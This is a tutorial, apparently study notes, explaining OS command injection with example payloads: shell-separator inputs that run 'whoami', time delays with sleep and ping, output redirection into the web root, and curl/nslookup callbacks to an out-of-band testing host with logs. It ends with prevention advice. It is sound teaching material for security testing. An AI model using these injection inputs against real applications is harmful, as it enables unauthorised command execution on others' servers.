# Command Injection

* Command Injection of OS-Command Injection is a web security vulnerability that allows an attacker to execute arbitrary command on the server that is running an application, an typically fully compromise the application and all it's data.

* Command Injection is also know as remote code execution (RCE).
* If an attacker found RCE on the system then they can execute system commands, and fully compromise the system. 

## Executing arbitrary command :

* For executing commands on server we need to find the parameter where we can provide the command to server and get the expected result.
* Example :  Consider a shopping application that lets the user view whether an item is in stock in a particular store. This information is accessed via a URL like : 

```url
https://insecure-website.com/stockStatus?productID=381&storeID=29
```
* To provide the stock information, the application must query various legacy system. For historical reason, the functionality is implemented by calling out to a shell command with product and store ID's as arguments:

```sh
stockreport.p1 381 29
```
* This command outputs the stock status for the specific item, which is returned to the user.
* Since the application implements no defenses against OS Command injection, an attacker can submit the following input to execute an arbitrary command:

```sh
& echo hello &
```
* if this input is submitted in the `productID` parameter, then the command executed by the application is:

```sh
stockreport.p1 & echo hello & 29
```
* The `echo` command simply causes the supplied string to be echoed in the output, and is a useful way to test for some type of OS Command injection. The `&` character is a shell command separator, and so what gets executed is actually three separate commands on after another. As a result, the output returned to the user is :

```plain
Error - productID was not provided
hello
29: command not found
```
* The three line output demonstrate that: 
  * The original `stockprice.p1` command was executed without its expected arguments, and so returned an error message.
  * The injection `echo` command command was executed, and the supplied string was echoed in the output.
  * The original arguments `29` was executed as a command which caused an error.

* Placing `&` command separator after the injected command is generally useful because it separates the injection command from whether follows the injection point. This reduces the likelihood that what follow will prevent the injection from executing.

## Useful Command

* When we identify OS command injection vulnerability, it is generally useful to execute some initial command to obtain information about the system that you have compromised. Below is a summary of some command that are used.

|Purpose of Command| Linux |Windows|
|--------|----------|----------|
|Name of current user |whoami |whoami|
|operating system|uname -a | ver|
|Network Configuration|ifconfig|ipconfig/all|
|Network Configuration|netstat -anto|netstat -an|
|Running process| ps -ef | tasklist|


## Blind OS Command injection vulnerabilities
* Many instances of OS Command injection are blind vulnerabilities. This means that the application does not return HTTP responses. Blind vulnerabilities can still be exploited, different techniques are required.

* Consider the web application lets user submit the feedback about the site, the user enters their emails address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out the `mail` program with the submitted details. For example:

```sh
mail -s "This site is great" -a From:peter@normal-user-.net feedback@vulnerable-website.com
```
* The output from the `mail` command (if any) is not returned in the application responses, and so using the `echo` payload would not be effective. In this situation, we can use variety of other techniques to detect and exploit a vulnerability.

### Detecting blind OS Command injection using time delays :

* In time delay we use system command to perform any action that takes time, and so that we can assume that there is injection vulnerabilities exists.
* In vulnerable parameter we use `& ping -c 5 127.0.0.1 &`

* Example : `ping -c 5 127.0.0.1` will `ping` `localhost` of the system and by using `-c` which mean no of packets is send, with this we can assume the time frame of `5 sec`, by assuming each packets takes approx `1 sec`.
```sh
rio@0xveil:~$ ping -c 5 127.0.0.1 
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.058 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.065 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.062 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.049 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.044 ms

--- 127.0.0.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4078ms
rtt min/avg/max/mdev = 0.044/0.055/0.065/0.007 ms
```
* Same as ping, we use `& sleep 5 & whoami &` or `& sleep 5 ; whoami &`, here `&`  and `;` both uses as a command separator.

* This command will sleep for `5 sec` then execute the next command `whoami` which will return the user of that system.

```sh
rio@0xveil:~$ sleep 5 ; whoami
rio
```

### Detecting blind OS Command injection using redirecting output :

* In redirecting output, we redirected the injected command output into the a file within web root that we can retrieve using the browser. For example, if the application servers static resources from the filesystem location `/var/www/static`, then we can submit the following input:
  * `& whoami > /var/www/static/whoami.txt &`
  * The `>` character redirect the `whoami` command into the specific file.
  * Then we can retrieve the file and view the output using `https://vulnerable-website.com/whoami.txt`


### Exploiting blind OS Command injection using out-of-band Application security testing (OAST) techniques :

* In Out-of-band application security testing `we uses external service to see otherwise invisible vulnerabilities`.

* Example : Setup OAST service, In this case i am using `Interactsh` online resource.
  * After setup, i get a unique address which is : `cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun`
  * In injection parameter i pass : `&  nslookup cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun  &` or `&  curl cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun  & ` any of them..

 
```plain

===================== REPORT =================


# My OAST Service : cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun

#	TIME	
TYPE
21	2 minutes ago	http
12	2 minutes ago	dns
11	2 minutes ago	dns
10	2 minutes ago	dns
9	2 minutes ago	dns
8	2 minutes ago	dns
7	2 minutes ago	dns
6	2 minutes ago	dns
5	2 minutes ago	dns
4	2 minutes ago	dns
3	2 minutes ago	dns
2	2 minutes ago	dns
1	2 minutes ago	dns

# This are the requested details that we use in injection parameter.

# Details of each request that we get in the interactsh:

--------------------------------21	2 minutes ago	http----------------------
---request 

GET / HTTP/1.1
Host: cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun
Accept: */*
User-Agent: curl/7.87.0

---response

HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Server: oast.fun

<html><head></head><body>byyyyyem9648ggr8zh0000ctv2apyxnfc</body></html>

-----------------------

--------------------------------2	2 minutes ago	dns-----------------------

---request

;; opcode: QUERY, status: NOERROR, id: 53395
;; flags: cd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun.	IN	 A

;; ADDITIONAL SECTION:

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: do; udp: 1410

---response

;; opcode: QUERY, status: NOERROR, id: 53395
;; flags: qr aa cd; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2

;; QUESTION SECTION:
;cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun.	IN	 A

;; ANSWER SECTION:
cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun.	3600	IN	A	206.189.156.69

;; AUTHORITY SECTION:
cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun.	3600	IN	NS	ns1.oast.fun.
cfnxypa2vtc0000hz8rgg8469meyyyyyb.oast.fun.	3600	IN	NS	ns2.oast.fun.

;; ADDITIONAL SECTION:
ns1.oast.fun.	3600	IN	A	206.189.156.69
ns2.oast.fun.	3600	IN	A	206.189.156.69

-----------------------

```


#### Resource:
* Burp-pro  : out-of-band application security testing (OATS) service.
* Online Resource : [Interactsh](https://app.interactsh.com/#/)

## Ways of injecting OS Command

* `&`
* `&&`
* `|`
* `||`
* The following command separator works only UNIX-Based systems:
  * `;`
  * Newline ( `0x0a` & `\n` )
  * On Unix-based system, you can also use backtrick or the dollar character to perform inline execution of an injected command within the original command:
    * `` ` ``
    * ``injected command ` `` 
    * `$(injected command)`

* Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow-in-band retrieval of command or are useful only for blind exploitation.
* Sometimes, the input that you control appears within quotation marks in the original Command. In this situation, you need to terminate the quote context ( using  ` " `  or  ` ' ` ) before using suitable shell metacharacters to inject a new command.

## How to prevent OS Command Injection attacks:

* We never call the OS Command from application-layer-code. In virtually every case, there are alternative ways of implementing the required functionality using safer platform APIs.
* It is important to implement Strong-Input validation functionality that perform filtering of OS Commands. Some example of effective validation included:
  * Validating against a whitelist of permitted values.
  * Validating that the input is a number.
  * Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
* Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.

***